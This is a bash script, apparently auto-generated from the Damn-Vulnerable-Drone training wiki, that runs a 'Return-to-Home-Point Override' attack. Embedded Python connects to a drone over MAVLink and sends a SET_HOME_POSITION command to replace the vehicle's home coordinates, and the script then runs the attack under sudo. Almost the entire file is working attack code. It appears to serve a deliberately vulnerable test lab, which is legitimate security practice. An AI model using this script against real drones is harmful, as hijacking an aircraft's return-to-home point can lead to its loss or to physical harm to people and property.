#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Return-to-Home-Point-Override.md
# Created: 2025-11-23 16:46:38
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=return-to-home-point-override src=Return-to-Home-Point-Override.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

# Replace with your connection string (e.g., tcp:10.13.0.3:5760)
connection_string = 'udp:127.0.0.1:14550'

# Connect to the vehicle
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("[+] Connected to drone")

# Define the new home position (latitude, longitude, altitude)
latitude = -35.363261      # Degrees
longitude = 149.165230     # Degrees
altitude = 584             # Meters

# Convert to MAVLink-compatible format
lat = int(latitude * 1e7)
lon = int(longitude * 1e7)
alt = int(altitude * 1000)  # mm

# Send SET_HOME_POSITION command
master.mav.set_home_position_send(
    target_system=master.target_system,
    latitude=lat,
    longitude=lon,
    altitude=alt,
    x=0, y=0, z=0,           # Not used
    q=[0, 0, 0, 0],          # Orientation (ignored)
    approach_x=0,
    approach_y=0,
    approach_z=0
)

print(f"[!] New home set: lat={latitude}, lon={longitude}, alt={altitude}m")
PY

log "[BLOCK 2] type=shell"
sudo python3 set_home_override.py

